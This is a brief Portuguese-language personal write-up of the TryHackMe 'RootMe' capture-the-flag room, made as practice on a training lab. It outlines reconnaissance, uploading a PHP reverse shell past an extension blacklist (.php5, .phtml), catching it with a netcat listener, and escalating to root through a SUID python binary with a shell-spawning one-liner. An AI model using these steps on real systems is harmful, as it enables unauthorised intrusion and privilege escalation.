# TryHackme - Rootme

[RootMe Room](https://tryhackme.com/room/rrootme)

### hangzou

1. **Reconhecimento**

   I. **Nmap Scan**
      - Portas
      - Serviços/Protocolos

   II. **Gobuster**
       
       - /panel/
       - /uploads/

2. **Shell Reverso**

   I. **PHP**
      - /usr/share/laudanum/php/php-reverse-shell.php
      - [Pentest Monkey PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

   II. **Blacklist Bypass**
      - .php3
      - .php4
      - .php5
      - .phtml

   III. **Netcat**
      - Endereço IP da Rede THM
      - nc -lvnp 4444
 
      > Solucionado com ajuda de Writeup

3. **Escalação de Privilégio**

   I. **Exploração de Permissão SUID**
      - /usr/bin/python 

      > Solucionado com ajuda de Writeup 

   II. **Python**
      - `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
 
   III. **Root**
      - `cd /root/`
      - `ls`
      - root.txt
      - `cat root.txt`

## Concluido!

Writeup Consultado:
 
[Infosec Writeup](https://infosecwriteups.com/tryhackme-rootme-ctf-walkthrough-detailed-a7c521df7339)

Observação:

Essa anotação é apenas um teste, que visa descrever meu passo a passo da resolução dos desafios do TryHackMe.
